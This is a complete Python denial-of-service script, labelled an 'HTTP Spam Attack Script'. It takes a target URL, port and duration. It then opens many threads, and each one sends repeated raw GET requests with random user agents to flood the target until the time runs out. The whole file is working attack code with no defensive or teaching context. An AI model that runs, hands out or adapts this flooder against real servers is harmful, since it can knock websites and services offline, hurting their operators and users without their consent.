import random
import socket
import threading
import os
import platform
import argparse
from urllib.parse import urlparse
import time

# Function to clear terminal screen
def clear_screen():
    if platform.system().upper() == "WINDOWS":
        os.system("cls")
    else:
        os.system("clear")

# Function to get user agents
def get_user_agents():
    with open("useragents.txt", "r") as file:
        user_agents = file.readlines()
    return [agent.strip() for agent in user_agents]

# DOS attack function
def http_spam_attack(target, port, attack_type, user_agents):
    # Process the target URL
    parsed_url = urlparse(target)
    host = parsed_url.hostname
    path = parsed_url.path if parsed_url.path else "/"
    
    if not host:
        host = target  # Fallback to raw target if parsing fails
    ip = socket.gethostbyname(host)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        packet_data = (
            f"{attack_type} {path} HTTP/1.1\nHost: {host}\nUser-Agent: {random.choice(user_agents)}\n\n"
        ).encode()

        s.connect((ip, port))

        for _ in range(50):
            s.sendall(packet_data)
            s.send(packet_data)

        s.close()

    except (BrokenPipeError, ConnectionResetError, socket.error, RuntimeError):
        pass

    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

# Function to run attack
def start_http_spam_attack(target, port, attack_time):
    attack_type = "GET"
    user_agents = get_user_agents()
    
    end_time = time.time() + attack_time  # Calculate end time

    while time.time() < end_time:
        threading.Thread(target=http_spam_attack, args=(target, port, attack_type, user_agents)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Spam Attack Script")
    parser.add_argument("target", help="The target URL or IP address")
    parser.add_argument("port", type=int, help="The target port")
    parser.add_argument("attack_time", type=int, help="Duration of the attack in seconds")

    args = parser.parse_args()

    start_http_spam_attack(args.target, args.port, args.attack_time)
